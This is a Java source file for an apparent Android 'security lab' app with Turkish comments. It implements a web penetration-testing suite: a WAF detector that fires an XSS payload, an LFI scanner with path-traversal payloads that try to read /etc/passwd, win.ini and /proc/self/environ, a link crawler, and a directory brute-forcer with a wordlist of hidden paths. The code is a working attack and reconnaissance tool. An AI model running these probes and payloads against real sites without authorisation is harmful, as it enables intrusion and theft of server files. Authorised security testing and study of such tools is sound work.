package com.example.karageyazilimsecuritylab;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WebPentestSuite {

    // 1. WAF DEDEKTÖRÜ (Güvenlik Duvarı Tespiti)
    public static String detectWAF(String urlStr) {
        try {
            if (!urlStr.startsWith("http")) urlStr = "http://" + urlStr;
            // WAF'ı tetikleyecek zararlı bir payload gönderiyoruz
            String target = urlStr + "?test=<script>alert(1)</script>";

            URL url = new URL(target);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);

            int code = conn.getResponseCode();
            String headers = conn.getHeaderFields().toString();

            // Tepkiye göre analiz
            if (code == 403 || code == 406) {
                if (headers.contains("Cloudflare")) return "[!] WAF TESPİT EDİLDİ: Cloudflare";
                if (headers.contains("ModSecurity")) return "[!] WAF TESPİT EDİLDİ: ModSecurity";
                if (headers.contains("Akamai")) return "[!] WAF TESPİT EDİLDİ: Akamai";
                return "[!] WAF AKTİF: Genel Koruma (Kod: " + code + ")";
            } else if (code == 200) {
                return "[-] WAF YOK veya Payload Engellenmedi.";
            }
        } catch (Exception e) { return "Bağlantı Hatası."; }
        return "Analiz yapılamadı.";
    }

    // 2. LFI SCANNER (Sunucu Dosyası Okuma Açığı)
    public static String scanLFI(String urlStr) {
        if (!urlStr.contains("=")) return "Hata: URL parametre içermeli (örn: site.com/index.php?page=)";

        // Linux ve Windows için LFI Payloadları
        String[] payloads = {
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "../../../../windows/win.ini",
                "/proc/self/environ"
        };

        StringBuilder report = new StringBuilder("LFI TARAMASI BAŞLADI: " + urlStr + "\n");
        String baseUrl = urlStr.substring(0, urlStr.indexOf("=") + 1);

        for (String payload : payloads) {
            try {
                String target = baseUrl + payload;
                String content = WebSecurityTools.getSourceCode(target);

                // Başarılı mı? (root:x:0:0 veya [extensions] kontrolü)
                if (content.contains("root:x:0:0") || content.contains("for 16-bit app support")) {
                    return "[!!!] KRİTİK LFI AÇIĞI BULUNDU!\nPayload: " + payload;
                }
            } catch (Exception ignored) {}
        }
        return "[-] LFI Açığı Bulunamadı.";
    }

    // 3. CRAWLER (Site Haritası Çıkarıcı)
    public static String crawlSite(String startUrl) {
        if (!startUrl.startsWith("http")) startUrl = "http://" + startUrl;
        StringBuilder sb = new StringBuilder("--- WEB SPIDER SONUÇLARI ---\n");

        try {
            String html = WebSecurityTools.getSourceCode(startUrl);
            // Regex ile href="..." linklerini bul
            Pattern p = Pattern.compile("href=\"(.*?)\"");
            Matcher m = p.matcher(html);

            int count = 0;
            while (m.find()) {
                String link = m.group(1);
                // Sadece iç linkleri veya http linklerini al
                if (link.startsWith("http") || link.startsWith("/")) {
                    sb.append("LINK: ").append(link).append("\n");
                    count++;
                }
                if (count > 20) break; // Sonsuz döngü koruması
            }
            if(count == 0) return "Link bulunamadı.";
            return sb.toString();
        } catch (Exception e) { return "Crawl hatası."; }
    }

    // 4. DIRBUSTER (Gizli Klasör Avcısı - Wordlist)
    public static String dirBuster(String urlStr) {
        if (!urlStr.startsWith("http")) urlStr = "http://" + urlStr;
        StringBuilder findings = new StringBuilder();

        // En yaygın gizli klasörler
        String[] dirs = {
                "backup", "db", "database", "admin", "logs", "test", "dev",
                "uploads", "images", "api", "v1", "v2", "private", "config", "tmp"
        };

        for (String dir : dirs) {
            String target = urlStr + "/" + dir;
            try {
                URL url = new URL(target);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("HEAD");
                conn.setConnectTimeout(2000);
                int code = conn.getResponseCode();

                if (code == 200 || code == 301 || code == 403) {
                    findings.append("[BULUNDU] /").append(dir).append(" (Kod: ").append(code).append(")\n");
                }
            } catch (Exception ignored) {}
        }

        if (findings.length() == 0) return "Gizli klasör bulunamadı.";
        return "--- DIRBUSTER SONUÇLARI ---\n" + findings.toString();
    }
}